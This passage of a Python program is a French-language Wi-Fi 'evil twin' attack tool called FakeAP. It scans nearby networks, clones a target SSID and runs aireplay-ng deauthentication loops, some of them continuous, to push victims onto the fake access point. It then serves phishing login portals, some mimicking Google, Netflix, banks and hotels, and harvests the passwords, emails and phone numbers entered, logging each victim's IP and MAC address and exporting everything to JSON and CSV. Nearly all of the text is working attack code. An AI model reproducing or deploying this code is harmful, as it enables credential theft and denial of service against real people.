<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#0a0a0a;font-family:'Courier New',monospace;
     display:flex;justify-content:center;align-items:center;height:100vh;color:#00ff41}}
.c{{background:rgba(0,255,65,.05);border:1px solid #00ff41;padding:40px;border-radius:4px;
    max-width:460px;width:90%;text-align:center;box-shadow:0 0 40px rgba(0,255,65,.15)}}
h1{{font-size:26px;letter-spacing:3px;margin-bottom:6px;text-shadow:0 0 10px #00ff41}}
.sub{{font-size:12px;color:#00cc33;letter-spacing:2px;margin-bottom:30px;opacity:.7}}
input{{width:100%;padding:12px 14px;margin:8px 0;background:#0a0a0a;
       border:1px solid #00ff41;border-radius:2px;color:#00ff41;
       font-family:'Courier New',monospace;font-size:14px;letter-spacing:1px}}
input::placeholder{{color:#005010}}
input:focus{{outline:none;box-shadow:0 0 8px rgba(0,255,65,.4)}}
button{{width:100%;padding:13px;background:transparent;color:#00ff41;
        border:1px solid #00ff41;font-family:'Courier New',monospace;
        letter-spacing:3px;cursor:pointer;margin-top:18px;font-size:15px;transition:all .3s}}
button:hover{{background:#00ff41;color:#0a0a0a}}
.footer{{margin-top:26px;font-size:10px;color:#004010;letter-spacing:2px}}
.blink{{animation:blink 1s step-end infinite}}
@keyframes blink{{50%{{opacity:0}}}}
</style></head><body>
<div class="c">
  <h1>📶 {ssid}</h1>
  <div class="sub">AUTHENTIFICATION REQUISE</div>
  <form method="POST">
    <input type="text" name="email" placeholder="EMAIL / IDENTIFIANT" required autocomplete="off">
    <input type="password" name="password" placeholder="MOT DE PASSE WIFI" required>
    <button type="submit">[ SE CONNECTER ]</button>
  </form>
  <div class="footer"><span class="blink">▋</span> FakeAP — ML © {datetime.now().year}</div>
</div></body></html>"""

def success_page_html(lang, redirect_url, seconds=3):
    t = get_lang(lang, 'success')
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8">
<meta http-equiv="refresh" content="{seconds};url={redirect_url}">
<style>
body{{background:#0a0a0a;font-family:'Courier New',monospace;
     display:flex;justify-content:center;align-items:center;height:100vh;color:#00ff41}}
.box{{text-align:center;border:1px solid #00ff41;padding:40px;border-radius:4px;
      box-shadow:0 0 30px rgba(0,255,65,.2)}}
.ok{{font-size:52px;margin-bottom:16px}}
h2{{font-size:22px;letter-spacing:3px;margin-bottom:8px}}
p{{color:#00cc33;font-size:12px;letter-spacing:2px}}
</style></head><body>
<div class="box">
  <div class="ok">✓</div>
  <h2>{t[0].upper()}</h2>
  <p>{t[1]}</p>
  <p style="margin-top:12px;opacity:.5">{t[2]} {seconds}s...</p>
</div></body></html>"""

def blocked_page_html(lang):
    t = get_lang(lang, 'blocked')
    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{t[0]}</title>
<style>
body{{background:#1a0000;font-family:'Courier New',monospace;
     display:flex;justify-content:center;align-items:center;height:100vh;color:#ff4444}}
.box{{text-align:center;border:1px solid #ff4444;padding:40px;border-radius:4px}}
.icon{{font-size:52px;margin-bottom:16px}}h2{{font-size:22px;letter-spacing:3px}}
p{{color:#cc2222;font-size:13px;margin-top:10px}}
</style></head><body>
<div class="box"><div class="icon">🚫</div><h2>{t[0].upper()}</h2><p>{t[1]}</p></div>
</body></html>"""

def get_inline_page(file_key, lang, ssid):
    wpa2 = (AP_AUTH_MODE == "wpa2")
    if file_key == "__google__":    return google_page_html(lang, wpa2)
    if file_key == "__netflix__":   return netflix_page_html(lang, wpa2)
    if file_key == "__bank__":      return bank_page_html(lang, wpa2)
    if file_key == "__hotel__":     return hotel_page_html(lang, ssid, wpa2)
    if file_key == "__operator__":  return operator_page_html(lang, ssid, wpa2)
    if file_key == "wifitoo.html":  return wifitoo_page_html(lang, ssid)
    return None

# ═══════════════════════════════════════════════════════════
#  RÉSEAU — INTERFACES & CANAL
# ═══════════════════════════════════════════════════════════
def run_silent(cmd):
    return subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_available_interfaces():
    interfaces = []
    try:
        r = subprocess.run("iwconfig 2>/dev/null | grep -E '^[a-zA-Z0-9]+' | awk '{print $1}'",
                           shell=True, capture_output=True, text=True)
        if r.stdout.strip():
            interfaces = r.stdout.strip().split('\n')
        if not interfaces:
            r = subprocess.run("ip link show 2>/dev/null | grep -E '^[0-9]+: [a-zA-Z0-9]+' | awk '{print $2}' | sed 's/://'",
                               shell=True, capture_output=True, text=True)
            interfaces = r.stdout.strip().split('\n')
        interfaces = [i.strip() for i in interfaces if i.strip() and 'lo' not in i and 'docker' not in i]
    except:
        pass
    return interfaces or ["wlp2s0", "wlan0"]

def detect_multi_interface():
    """Détecter si 2 cartes WiFi sont disponibles"""
    global DUAL_CARD_MODE, INTERFACE_AP, INTERFACE_DEAUTH
    ifaces = get_available_interfaces()
    wifi = [i for i in ifaces if any(x in i for x in ['wl','wlan','wlp','wlx','ath','mon'])]
    if len(wifi) >= 2:
        DUAL_CARD_MODE    = True
        INTERFACE_AP      = wifi[0]
        INTERFACE_DEAUTH  = wifi[1]
        print(f"  {C.OK}2 cartes WiFi détectées: {C.CYAN}{wifi[0]}{C.END} (AP) + {C.GREEN}{wifi[1]}{C.END} (Deauth)")
    else:
        DUAL_CARD_MODE    = False
        INTERFACE_AP      = ifaces[0] if ifaces else INTERFACE
        INTERFACE_DEAUTH  = INTERFACE_AP
        print(f"  {C.WARN}1 seule carte WiFi: {C.CYAN}{INTERFACE_AP}{C.END} {C.DIM}(AP + Deauth séquentiels){C.END}")
    return DUAL_CARD_MODE

def auto_select_channel(interface):
    """Sélectionner automatiquement le canal le moins congestionné"""
    print(f"  {C.INFO}Analyse des canaux sur {interface}...{C.END}")
    channel_count = {str(ch): 0 for ch in range(1, 12)}
    try:
        r = subprocess.run(f"sudo iw dev {interface} scan 2>/dev/null",
                           shell=True, capture_output=True, text=True, timeout=12)
        for line in r.stdout.split('\n'):
            if 'freq:' in line:
                m = re.search(r'freq: (\d+)', line)
                if m:
                    freq = int(m.group(1))
                    if 2412 <= freq <= 2462:
                        ch = str((freq - 2412) // 5 + 1)
                        channel_count[ch] = channel_count.get(ch, 0) + 1
        # Canal le moins utilisé
        best = min(channel_count, key=channel_count.get)
        print(f"  {C.OK}Canal optimal : {C.YELLOW}{best}{C.END} {C.DIM}({channel_count[best]} réseau(x) détecté(s)){C.END}")
        return best
    except:
        print(f"  {C.WARN}Scan canal échoué, utilisation du canal {CURRENT_CHANNEL}{C.END}")
        return CURRENT_CHANNEL

def generate_random_ssid(operator=None):
    """Générer un SSID aléatoire crédible"""
    if operator and operator in SSID_TEMPLATES:
        templates = SSID_TEMPLATES[operator]
    else:
        operator  = random.choice(list(SSID_TEMPLATES.keys()))
        templates = SSID_TEMPLATES[operator]
    template  = random.choice(templates)
    rand_val  = random.randint(0, 0xFFFF)
    return template.format(rand_val)

# ═══════════════════════════════════════════════════════════
#  SCAN WIFI
# ═══════════════════════════════════════════════════════════
def scan_wifi_networks(interface):
    print()
    scan_animation(f"SCAN 802.11 — {interface}", duration=2.5)
    hex_dump_animation(lines=3, delay=0.06)
    networks = []
    try:
        run_silent(f"sudo ip link set {interface} down")
        run_silent(f"sudo iw dev {interface} set type monitor 2>/dev/null")
        run_silent(f"sudo ip link set {interface} up")
        time.sleep(1)

        r = subprocess.run(f"sudo iw dev {interface} scan 2>/dev/null",
                           shell=True, capture_output=True, text=True, timeout=15)
        lines = r.stdout.strip().split('\n')
        current_net = {}
        for line in lines:
            line = line.strip()
            if line.startswith('BSS '):
                if current_net and 'ssid' in current_net: networks.append(current_net)
                m = re.search(r'BSS ([0-9a-fA-F:]{17})', line)
                current_net = {'bssid': m.group(1)} if m else {}
            elif 'SSID:' in line and current_net is not None:
                ssid = line.split('SSID:')[1].strip()
                if ssid and ssid != '\x00': current_net['ssid'] = ssid
            elif 'signal:' in line and current_net is not None:
                m = re.search(r'signal: (-?\d+\.?\d*)', line)
                if m: current_net['signal'] = m.group(1)
            elif 'freq:' in line and current_net is not None:
                m = re.search(r'freq: (\d+)', line)
                if m: current_net['freq'] = m.group(1)
        if current_net and 'ssid' in current_net: networks.append(current_net)

        if not networks:
            r = subprocess.run("nmcli -t -f SSID,BSSID,CHAN,SIGNAL dev wifi list 2>/dev/null | head -20",
                               shell=True, capture_output=True, text=True, timeout=10)
            for line in r.stdout.strip().split('\n'):
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) >= 4 and parts[0]:
                        ch = parts[2] if len(parts) > 2 else "6"
                        networks.append({'ssid': parts[0], 'bssid': parts[1] if len(parts)>1 else "00:00:00:00:00:00",
                                         'signal': parts[3] if len(parts)>3 else "-50",
                                         'freq': str(2412 + (int(ch)-1)*5) if ch.isdigit() else "2412"})
    except subprocess.TimeoutExpired:
        print(f"  {C.ALERT}Timeout scan{C.END}")
    except Exception as e:
        print(f"  {C.ALERT}Erreur: {e}{C.END}")
    finally:
        run_silent(f"sudo ip link set {interface} down")
        run_silent(f"sudo iw dev {interface} set type managed 2>/dev/null")
        run_silent(f"sudo ip link set {interface} up")

    unique, seen = [], set()
    for net in networks:
        if 'ssid' in net and net['ssid'] and net['ssid'] not in seen:
            seen.add(net['ssid'])
            net.setdefault('bssid','00:00:00:00:00:00'); net.setdefault('signal','-50'); net.setdefault('freq','2412')
            unique.append(net)
    return unique

# ─────────────────────────────────────────────
#  DEAUTH — NORMAL + CONTINU
# ─────────────────────────────────────────────
def deauth_attack(target_bssid, target_ssid, interface, count=20, continuous=False):
    global DEAUTH_RUNNING
    print(f"\n  {C.RED}{C.BOLD}╔{'═'*52}╗{C.END}")
    glitch_text(f"  ⚡  DEAUTH → {target_ssid[:38]}", color=C.RED)
    print(f"  {C.RED}{C.BOLD}╚{'═'*52}╝{C.END}")
    print(f"  {C.DIM}Interface: {interface}  |  Mode: {'CONTINU' if continuous else f'{count} paquets'}{C.END}")

    DEAUTH_RUNNING = True
    try:
        run_silent(f"sudo ip link set {interface} down")
        run_silent(f"sudo iw dev {interface} set type monitor")
        run_silent(f"sudo ip link set {interface} up")
        time.sleep(1)

        iteration = 0
        while DEAUTH_RUNNING:
            for i in range(count):
                if not DEAUTH_RUNNING: break
                cmd = f"sudo aireplay-ng -0 1 -a {target_bssid} {interface} --ignore-negative-one"
                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                bar = '█'*(i+1) + '░'*(count-i-1)
                pct = int(((i+1)/count)*100)
                msg = f"LOOP #{iteration+1}" if continuous else f"PKT #{i+1}/{count}"
                print(f"\r  {C.RED}{C.BOLD}⚡ [{bar}] {pct:3d}%  {msg}{C.END}", end='')
                sys.stdout.flush(); time.sleep(0.10)
            iteration += 1
            if not continuous: break
            print(f"\r  {C.YELLOW}↻ Boucle #{iteration+1} — attente 5s{C.END}          ")
            for _ in range(50):
                if not DEAUTH_RUNNING: break
                time.sleep(0.1)

        print(f"\n\n  {C.OK}Deauth terminé ({iteration} boucle(s)){C.END}")
    except Exception as e:
        print(f"\n  {C.ALERT}Erreur deauth: {e}{C.END}")
    finally:
        run_silent(f"sudo ip link set {interface} down")
        run_silent(f"sudo iw dev {interface} set type managed")
        run_silent(f"sudo ip link set {interface} up")
        DEAUTH_RUNNING = False

def start_continuous_deauth():
    """Démarrer/arrêter le deauth continu"""
    global DEAUTH_RUNNING, DEAUTH_THREAD, DEAUTH_CONTINUOUS
    if not CONTINUOUS_DEAUTH_TARGET:
        print(f"  {C.ALERT}Aucune cible définie — utilisez Clone WiFi (option 12) d'abord{C.END}")
        time.sleep(2); return
    if DEAUTH_RUNNING:
        DEAUTH_RUNNING = False
        print(f"  {C.WARN}Deauth continu ARRÊTÉ{C.END}"); time.sleep(1); return
    t = CONTINUOUS_DEAUTH_TARGET
    DEAUTH_THREAD = threading.Thread(target=deauth_attack,
                    args=(t['bssid'], t['ssid'], t['interface'], 15, True), daemon=True)
    DEAUTH_THREAD.start()
    print(f"  {C.OK}Deauth continu DÉMARRÉ → {C.PURPLE}{t['ssid']}{C.END}"); time.sleep(2)

# ─────────────────────────────────────────────
#  EVIL TWIN AUTO (tout-en-un)
# ─────────────────────────────────────────────
def evil_twin_auto():
    global SELECTED_SSID, CURRENT_CHANNEL, DEAUTH_THREAD, SELECTED_PAGE
    global SELECTED_FILE, CURRENT_REDIRECT, DEAUTH_RUNNING, CONTINUOUS_DEAUTH_TARGET

    print_header("⚔  EVIL TWIN AUTO — SCAN + CLONE + DEAUTH", C.RED)
    typewriter("  Mode automatique : scan → sélection → clone → deauth", color=C.DIM, delay=0.02)

    if DUAL_CARD_MODE:
        print(f"  {C.OK}Mode 2 cartes actif: AP={INTERFACE_AP}  Deauth={INTERFACE_DEAUTH}{C.END}")
        scan_iface  = INTERFACE_DEAUTH
        deauth_iface = INTERFACE_DEAUTH
    else:
        ifaces = get_available_interfaces()
        scan_iface   = ifaces[0] if ifaces else CURRENT_INTERFACE
        deauth_iface = scan_iface
        print(f"  {C.WARN}1 seule carte — deauth avant lancement AP{C.END}")

    networks = scan_wifi_networks(scan_iface)
    if not networks:
        print(f"  {C.ALERT}Aucun réseau détecté{C.END}"); time.sleep(3); return

    print_section(f"CIBLES DISPONIBLES — {len(networks)} réseau(x)")
    divider()
    valid = []
    for i, net in enumerate(networks, 1):
        if not net.get('ssid'): continue
        valid.append(net)
        try:
            dbm = int(float(net.get('signal','-50')))
            if dbm > -50:   sc,sb = C.GREEN, "████████"
            elif dbm > -65: sc,sb = C.GREEN, "██████░░"
            elif dbm > -75: sc,sb = C.YELLOW,"████░░░░"
            else:           sc,sb = C.RED,   "██░░░░░░"
        except: sc,sb = C.YELLOW,"████░░░░"; dbm = -50
        freq = net.get('freq','2412')
        try:
            fi = int(freq); ch = str((fi-2412)//5+1) if 2412<=fi<=2484 else str((fi-5180)//5+36)
        except: ch = "6"
        print(f"\n  {C.YELLOW}{C.BOLD}[{i:>2}]{C.END}  {C.WHITE}{C.BOLD}{net['ssid']}{C.END}")
        print(f"        {C.BLACK}BSSID:{C.END} {C.DIM}{net['bssid']}{C.END}   {C.BLACK}CH:{C.END}{C.CYAN}{ch}{C.END}   {sc}{sb} {dbm}dBm{C.END}")
    divider()

    try:
        choice = int(input(f"\n  {C.PROMPT}Cible [{C.YELLOW}1-{len(valid)}{C.END}]: ").strip())
        if not 1 <= choice <= len(valid): raise ValueError
        target = valid[choice - 1]
    except (ValueError, KeyboardInterrupt):
        print(f"  {C.ALERT}Annulé{C.END}"); time.sleep(1); return

    freq = target.get('freq','2412')
    try:
        fi = int(freq); ch = str((fi-2412)//5+1) if 2412<=fi<=2484 else str((fi-5180)//5+36)
    except: ch = "6"

    SELECTED_SSID    = target['ssid'].replace(" ","_").replace("'","").replace('"',"")
    CURRENT_CHANNEL  = ch
    SELECTED_PAGE    = PAGES[13]
    SELECTED_FILE    = "wifitoo.html"
    CURRENT_REDIRECT = "http://192.168.10.1/wifitoo.html"
    CONTINUOUS_DEAUTH_TARGET = {'bssid': target['bssid'], 'ssid': target['ssid'], 'interface': deauth_iface}

    print()
    progress_bar("PRÉPARATION EVIL TWIN", total=25, delay=0.04)
    print(f"  {C.OK}Cible : {C.PURPLE}{C.BOLD}{SELECTED_SSID}{C.END}")
    print(f"  {C.INFO}BSSID : {C.RED}{target['bssid']}{C.END}")
    print(f"  {C.INFO}Canal : {C.YELLOW}{ch}{C.END}")

    cont_q = input(f"\n  {C.PROMPT}Deauth continu? {C.RED}(o/N){C.END}: ").strip().lower()
    continuous = (cont_q == 'o')

    DEAUTH_RUNNING = True
    DEAUTH_THREAD  = threading.Thread(target=deauth_attack,
                     args=(target['bssid'], target['ssid'], deauth_iface, 10, continuous), daemon=True)
    DEAUTH_THREAD.start()
    print(f"\n  {C.OK}Evil Twin prêt — AP va démarrer automatiquement{C.END}")
    time.sleep(3)

# ═══════════════════════════════════════════════════════════
#  HTTP HANDLER AVANCÉ
# ═══════════════════════════════════════════════════════════
class PortalHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        if HTTP_LOG_ENABLED and not STEALTH_MODE:
            try:
                ts  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                msg = f"[{ts}] {self.client_address[0]} — {format % args}\n"
                with open(HTTP_LOG_FILE, 'a') as f: f.write(msg)
            except: pass
        with STATS_LOCK:
            LIVE_STATS['requests'] += 1

    def do_GET(self):
        ip   = self.client_address[0]
        path = self.path.split('?')[0]

        # Log requête HTTP
        if HTTP_LOG_ENABLED and not STEALTH_MODE:
            try:
                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(HTTP_LOG_FILE, 'a') as f:
                    f.write(f"[{ts}] GET {ip} → {self.path}\n")
            except: pass

        with STATS_LOCK:
            LIVE_STATS['clients'].add(ip)
            LIVE_STATS['requests'] += 1

        # IP bloquée
        if ip in BLOCKED_IPS:
            lang = detect_language(self.headers)
            self.send_response(403); self.send_header('Content-Type','text/html')
            self.send_header('Cache-Control','no-store'); self.end_headers()
            self.wfile.write(blocked_page_html(lang).encode()); return

        # Page de chargement à la première visite
        if path == '/' and self.headers.get('User-Agent','') and 'loading' not in self.path:
            lang = detect_language(self.headers)
            self.send_response(200); self.send_header('Content-Type','text/html')
            self.send_header('Cache-Control','no-store'); self.end_headers()
            self.wfile.write(loading_page_html(lang, '/portal').encode()); return

        if path in ('/portal', '/wifitoo.html', '/wifitoo'):
            self.serve_portal()
        else:
            self.serve_portal()

    def serve_portal(self):
        lang = detect_language(self.headers)
        self.send_response(200); self.send_header('Content-Type','text/html')
        self.send_header('Cache-Control','no-store'); self.end_headers()

        # Page inline
        if SELECTED_FILE and SELECTED_FILE.startswith('__'):
            html = get_inline_page(SELECTED_FILE, lang, SELECTED_SSID)
            self.wfile.write(html.encode()); return

        if SELECTED_FILE == 'wifitoo.html':
            self.wfile.write(wifitoo_page_html(lang, SELECTED_SSID).encode()); return

        # Fichier HTML externe
        try:
            if os.path.exists(SELECTED_FILE):
                with open(SELECTED_FILE, 'rb') as f:
                    content = f.read()
                footer = f"""<!-- FakeAP v4.0 — ML -->
<div style="position:fixed;bottom:8px;right:8px;color:#00ff41;
     font-family:'Courier New',monospace;font-size:9px;opacity:.2">
FAKEAP::ML::{CURRENT_INTERFACE}::{SELECTED_SSID}</div>""".encode()
                content = content.replace(b'</body>', footer + b'</body>')
                self.wfile.write(content); return
        except: pass

        # Fallback inline
        html = get_inline_page('wifitoo.html', lang, SELECTED_SSID) or wifitoo_page_html(lang, SELECTED_SSID)
        self.wfile.write(html.encode())

    def do_POST(self):
        ip   = self.client_address[0]
        lang = detect_language(self.headers)

        # IP bloquée
        if ip in BLOCKED_IPS:
            self.send_response(403); self.send_header('Content-Type','text/html')
            self.send_header('Cache-Control','no-store'); self.end_headers()
            self.wfile.write(blocked_page_html(lang).encode()); return

        # Vérifier tentatives max
        if ATTEMPT_COUNTER[ip] >= MAX_ATTEMPTS:
            BLOCKED_IPS.add(ip)
            if BLOCK_AFTER_CAP:
                run_silent(f"sudo iptables -A INPUT -s {ip} -j DROP")
                run_silent(f"sudo iptables -A FORWARD -s {ip} -j DROP")
            self.send_response(403); self.send_header('Content-Type','text/html')
            self.send_header('Cache-Control','no-store'); self.end_headers()
            self.wfile.write(blocked_page_html(lang).encode()); return

        try:
            length = int(self.headers.get('Content-Length', 0))
            if length > 0:
                data   = self.rfile.read(length).decode('utf-8', errors='ignore')
                params = parse_qs(data)

                password = (params.get('password',[''])[0] or params.get('pass',[''])[0] or
                            params.get('pwd',[''])[0]       or params.get('motdepasse',[''])[0])
                username  = params.get('username',[''])[0]
                email     = params.get('email',[''])[0]
                phone     = params.get('phone',[''])[0]

                ATTEMPT_COUNTER[ip] += 1

                if password or username or email or phone:
                    mac = self.get_mac_address(ip)
                    capture_data = {
                        'timestamp':  datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        'ip': ip, 'mac': mac,
                        'page_file':  SELECTED_FILE,
                        'page_name':  SELECTED_PAGE['name'] if SELECTED_PAGE else "WiFiToo",
                        'ssid':       SELECTED_SSID,
                        'gateway':    CURRENT_GATEWAY,
                        'channel':    CURRENT_CHANNEL,
                        'lang':       lang,
                        'password':   password,
                        'username':   username,
                        'email':      email,
                        'phone':      phone,
                        'attempts':   ATTEMPT_COUNTER[ip],
                        'tool':       'FakeAP', 'creator': 'ML',
                        'attack':     'deauth_clone' if DEAUTH_RUNNING else 'normal',
                    }
                    self.save_capture(capture_data)
                    self.show_capture_notification(ip, email or username, password, lang)

                    if BLOCK_AFTER_CAP:
                        BLOCKED_IPS.add(ip)
                        run_silent(f"sudo iptables -A INPUT -s {ip} -j DROP")
                        run_silent(f"sudo iptables -A FORWARD -s {ip} -j DROP")
        except Exception:
            pass

        self.send_response(200); self.send_header('Content-Type','text/html')
        self.send_header('Cache-Control','no-store'); self.end_headers()
        self.wfile.write(success_page_html(lang, CURRENT_REDIRECT).encode())

    def get_mac_address(self, ip):
        try:
            time.sleep(0.3)
            with open('/proc/net/arp') as f:
                for line in f.readlines()[1:]:
                    parts = line.split()
                    if len(parts) >= 4 and parts[0] == ip:
                        return parts[3]
        except: pass
        return "00:00:00:00:00:00"

    def save_capture(self, data):
        try:
            captures = []
            if os.path.exists(CAPTURES_FILE):
                with open(CAPTURES_FILE) as f: captures = json.load(f)
            captures.append(data)
            with open(CAPTURES_FILE, 'w') as f:
                json.dump(captures, f, indent=2, ensure_ascii=False)
            with STATS_LOCK:
                LIVE_STATS['captures'] = len(captures)
                LIVE_STATS['clients'].add(data['ip'])
        except: pass

    def show_capture_notification(self, ip, user, pwd, lang='fr'):
        sound_alert()
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"\n  {C.RED}{C.BOLD}╔{'═'*54}╗{C.END}")
        glitch_text(f"  ║   🔓  NOUVELLE CAPTURE — {ts}            ║", color=C.RED)
        print(f"  {C.RED}{C.BOLD}╠{'═'*54}╣{C.END}")
        print(f"  {C.RED}║{C.END}  {C.CYAN}IP      :{C.END} {ip:<46}{C.RED}║{C.END}")
        print(f"  {C.RED}║{C.END}  {C.CYAN}USER    :{C.END} {str(user)[:46]:<46}{C.RED}║{C.END}")
        print(f"  {C.RED}║{C.END}  {C.CYAN}PASS    :{C.END} {str(pwd)[:46]:<46}{C.RED}║{C.END}")
        print(f"  {C.RED}║{C.END}  {C.CYAN}LANGUE  :{C.END} {lang.upper():<46}{C.RED}║{C.END}")
        print(f"  {C.RED}{C.BOLD}╚{'═'*54}╝{C.END}\n")
        sys.stdout.flush()

# ═══════════════════════════════════════════════════════════
#  CAPTURES — AFFICHAGE LIVE, CSV, STATS
# ═══════════════════════════════════════════════════════════
def load_captures():
    try:
        if os.path.exists(CAPTURES_FILE):
            with open(CAPTURES_FILE) as f: return json.load(f)
    except: pass
    return []

def show_live_captures():
    """Afficher les captures en temps réel (Ctrl+C pour quitter)"""
    print_header("📋 CAPTURES EN TEMPS RÉEL", C.GREEN)
    print(f"  {C.DIM}Actualisation auto — Ctrl+C pour revenir au menu{C.END}\n")
    last_count = -1
    try:
        while True:
            captures = load_captures()
            if len(captures) != last_count:
                clear_screen()
                print_banner()
                print_header("📋 CAPTURES EN TEMPS RÉEL", C.GREEN)
                now = datetime.now().strftime("%H:%M:%S")
                print(f"  {C.DIM}Actualisé: {now}  |  Total: {C.GREEN}{C.BOLD}{len(captures)}{C.END}{C.DIM}  |  Ctrl+C = retour{C.END}\n")

                if not captures:
                    print(f"  {C.DIM}Aucune capture pour le moment...{C.END}")
                else:
                    # Header tableau
                    print(f"  {C.CYAN}{C.BOLD}{'#':<4} {'HEURE':<20} {'IP':<16} {'MAC':<18} {'USER/EMAIL':<25} {'PASS':<20}{C.END}")
                    divider()
                    for i, cap in enumerate(captures[-20:], 1):
                        ts   = cap.get('timestamp','')[-8:]
                        ip   = cap.get('ip','')[:15]
                        mac  = cap.get('mac','')[:17]
                        user = (cap.get('email','') or cap.get('username',''))[:24]
                        pwd  = cap.get('password','')[:19]
                        row  = f"  {C.YELLOW}{i:>3}{C.END}  {C.DIM}{ts:<20}{C.END}{C.WHITE}{ip:<16}{C.END}{C.BLACK}{mac:<18}{C.END}{C.GREEN}{user:<25}{C.END}{C.RED}{C.BOLD}{pwd:<20}{C.END}"
                        print(row)
                    if len(captures) > 20:
                        print(f"  {C.DIM}... et {len(captures)-20} capture(s) plus ancienne(s) (voir captures.json){C.END}")
                last_count = len(captures)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n  {C.DIM}Retour au menu...{C.END}"); time.sleep(0.5)

def export_captures_csv():
    """Exporter captures.json → captures.csv"""
    captures = load_captures()
    if not captures:
        print(f"  {C.WARN}Aucune capture à exporter{C.END}"); time.sleep(2); return
    try:
        fields = ['timestamp','ip','mac','ssid','page_name','lang','email','username','phone','password','attack']
        with open(CSV_FILE, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=fields, extrasaction='ignore')
            writer.writeheader()
            writer.writerows(captures)
        print(f"  {C.OK}{len(captures)} capture(s) exportée(s) → {C.CYAN}{CSV_FILE}{C.END}")
        # Afficher aperçu
        print(f"\n  {C.DIM}Aperçu (5 premières):{C.END}")
        for cap in captures[:5]:
            ts   = cap.get('timestamp','')
            ip   = cap.get('ip','')
            user = cap.get('email','') or cap.get('username','')
            pwd  = cap.get('password','')
            print(f"  {C.CYAN}[{ts}]{C.END} {ip}  {C.GREEN}{user}{C.END}  {C.RED}{pwd}{C.END}")
    except Exception as e:
        print(f"  {C.ALERT}Erreur export: {e}{C.END}")
    time.sleep(3)

def show_stats():
    """Afficher les statistiques en direct"""
    captures = load_captures()
    print_header("📊 STATISTIQUES FAKEAP", C.CYAN)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    uptime = ""
    if LIVE_STATS['start_time']:
        delta = int(time.time() - LIVE_STATS['start_time'])
        h, m, s = delta//3600, (delta%3600)//60, delta%60
        uptime = f"{h:02d}:{m:02d}:{s:02d}"

    print(f"\n  {C.GREEN}{'─'*58}{C.END}")
    print(f"  {C.CYAN}Date         :{C.END}  {C.WHITE}{now}{C.END}")
    print(f"  {C.CYAN}Uptime       :{C.END}  {C.WHITE}{uptime or 'N/A'}{C.END}")
    print(f"  {C.CYAN}SSID actif   :{C.END}  {C.PURPLE}{C.BOLD}{SELECTED_SSID}{C.END}")
    print(f"  {C.CYAN}Interface    :{C.END}  {C.BLUE}{CURRENT_INTERFACE}{C.END}")
    print(f"  {C.GREEN}{'─'*58}{C.END}")
    print(f"  {C.CYAN}Total captures :{C.END}  {C.RED}{C.BOLD}{len(captures)}{C.END}")

    if captures:
        ips  = [c.get('ip','') for c in captures]
        macs = [c.get('mac','') for c in captures if c.get('mac','') != '00:00:00:00:00:00']
        pwds = [c.get('password','') for c in captures if c.get('password','')]
        pages = Counter(c.get('page_name','?') for c in captures)
        langs = Counter(c.get('lang','fr') for c in captures)

        print(f"  {C.CYAN}IPs uniques    :{C.END}  {C.YELLOW}{len(set(ips))}{C.END}")
        print(f"  {C.CYAN}MACs capturées :{C.END}  {C.YELLOW}{len(set(macs))}{C.END}")
        print(f"  {C.CYAN}Mots de passe  :{C.END}  {C.RED}{len(pwds)}{C.END}")
        print(f"  {C.CYAN}Req. HTTP      :{C.END}  {C.GREEN}{LIVE_STATS['requests']}{C.END}")

        print(f"\n  {C.GREEN}{'─'*58}{C.END}")
        print(f"  {C.CYAN}Pages utilisées:{C.END}")
        for page, cnt in pages.most_common():
            print(f"    {C.YELLOW}•{C.END} {page:<30} {C.GREEN}{cnt}x{C.END}")
        print(f"\n  {C.CYAN}Langues détectées:{C.END}")
        for lg, cnt in langs.most_common():
            print(f"    {C.YELLOW}•{C.END} {lg.upper():<10} {C.GREEN}{cnt}x{C.END}")

        print(f"\n  {C.GREEN}{'─'*58}{C.END}")
        print(f"  {C.CYAN}IPs connectées (actives):{C.END}")
        for ip in sorted(set(ips))[:10]:
            cap_count = ips.count(ip)
            blocked   = "🚫" if ip in BLOCKED_IPS else "  "
            print(f"    {blocked} {C.WHITE}{ip:<18}{C.END} {C.YELLOW}{cap_count} capture(s){C.END}")

    print(f"  {C.GREEN}{'─'*58}{C.END}")
    input(f"\n  {C.DIM}[ Entrée pour continuer ]{C.END}")

# ═══════════════════════════════════════════════════════════
#  PROFILS — SAUVEGARDER / CHARGER
# ═══════════════════════════════════════════════════════════
def save_profile(name=None):
    global PROFILES_DIR
    os.makedirs(PROFILES_DIR, exist_ok=True)
    if not name:
        name = input(f"  {C.PROMPT}Nom du profil: ").strip()
    if not name: print(f"  {C.ALERT}Nom invalide{C.END}"); time.sleep(1); return
    profile = {
        'name': name, 'created': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'interface': CURRENT_INTERFACE, 'gateway': CURRENT_GATEWAY,
        'netmask': CURRENT_NETMASK, 'dhcp_start': CURRENT_DHCP_START,
        'dhcp_end': CURRENT_DHCP_END, 'dhcp_lease': CURRENT_DHCP_LEASE,
        'dns': CURRENT_DNS, 'channel': CURRENT_CHANNEL,
        'ssid': SELECTED_SSID, 'redirect': CURRENT_REDIRECT,
        'ap_auth': AP_AUTH_MODE, 'ap_wpa_pass': AP_WPA_PASS,
        'stealth': STEALTH_MODE, 'max_attempts': MAX_ATTEMPTS,
        'block_after_cap': BLOCK_AFTER_CAP,
        'whitelist': list(WHITELIST_MAC),
        'page': SELECTED_FILE,
    }
    path = os.path.join(PROFILES_DIR, f"{name.replace(' ','_')}.json")
    with open(path, 'w') as f: json.dump(profile, f, indent=2)
    print(f"  {C.OK}Profil sauvegardé: {C.CYAN}{path}{C.END}"); time.sleep(2)

def load_profile():
    global CURRENT_INTERFACE, CURRENT_GATEWAY, CURRENT_NETMASK
